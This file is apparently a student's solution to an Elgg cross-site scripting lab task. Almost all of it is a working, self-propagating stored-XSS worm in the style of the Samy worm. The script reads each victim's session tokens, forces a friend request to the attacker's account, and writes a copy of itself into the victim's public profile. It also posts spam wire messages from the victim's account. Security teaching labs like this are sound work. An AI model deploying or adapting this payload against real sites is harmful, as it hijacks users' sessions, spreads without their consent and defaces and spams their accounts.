//task 4
//self propagation through DOM
//the variable worm code was set into the description of the victim's profile
//So,when another user visits the victim's profile,he is also affected by the wormcode
//accesslevel is also set to 2 so that it's public
//So,when samy uploads this code to this about me,anyone visiting this profile will carry the worm
<script type="text/javascript" id="worm">
window.onload = function(){        
   	var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; //1
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";         //2
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); //3
        
       var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token; //FILL IN

	//Create and send Ajax request to add friend
	if(elgg.session.user.guid != 47){
	Ajax=new XMLHttpRequest();
	Ajax.open("GET",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send();
    }
    var guid = "&guid=" + elgg.session.user.guid;
	var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token = "&__elgg_token="+elgg.security.token.__elgg_token;
	var name = "&name="+elgg.session.user.name;
	var desc = "&description=1605097" + wormCode
	desc +="&accesslevel[description]=2";  //4
	var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
	var content = token + ts + name + desc + guid;
	if(elgg.session.user.guid != 47)
	{
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
	}

	    var guid = "&guid=" + elgg.session.user.guid;
		var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token = "&__elgg_token="+elgg.security.token.__elgg_token;
		var body="&body=To earn 12 USD/Hour(!), visit now: ";
        var link="http://www.xsslabelgg.com/profile/samy"
		var sendurl = "http://www.xsslabelgg.com/action/thewire/add";
		var content = token+ts+body+link
		if(elgg.session.user.guid != 47)
		{
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
		}

	
}
</script>


